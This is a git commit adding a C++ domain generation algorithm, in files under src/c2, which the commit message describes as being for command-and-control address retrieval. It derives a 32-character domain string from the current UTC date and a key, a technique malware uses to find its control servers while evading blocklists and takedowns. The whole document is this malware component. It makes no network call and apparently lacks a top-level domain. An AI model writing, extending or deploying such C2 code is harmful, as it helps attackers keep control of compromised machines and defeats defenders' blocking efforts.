83a0d4f62fd67c3156c6b73566ccd8e5ec340169
Sgt Supergeil <maxrademacher02@gmail.com>
2021-01-27 21:48:27 +0100

    implemented dga for c2 addr retrieval

---
+++ src/c2/dga.cpp
@@ -0,0 +1,32 @@
+#include "dga.h"
+
+std::string dga(int key)
+{
+    int fullkey[4];
+    char domain[32];
+    static std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+
+    time_t rawtime;
+    struct tm* format_time;
+
+    time(&rawtime);
+    format_time = gmtime(&rawtime);
+
+    fullkey[0] = format_time->tm_year;
+    fullkey[1] = format_time->tm_mon;
+    fullkey[2] = format_time->tm_mday;
+    fullkey[3] = key;
+
+    int tmpvar = fullkey[2] + fullkey[3];
+    int pivot;
+    char el;
+
+    for (int ind = 0; ind < 32; ind++) {
+        pivot = ind ^ fullkey[0] ^ fullkey[1] ^ tmpvar;
+        el = chars[pivot % chars.length()];
+        domain[ind] = el;
+        tmpvar = pivot ^ tmpvar ^ (int)el;
+    }
+    return std::string(&domain[0], 32);
+
+}
---
+++ src/c2/dga.h
@@ -0,0 +1,5 @@
+#pragma once
+#include <time.h>
+#include <string>
+
+std::string dga(int key);
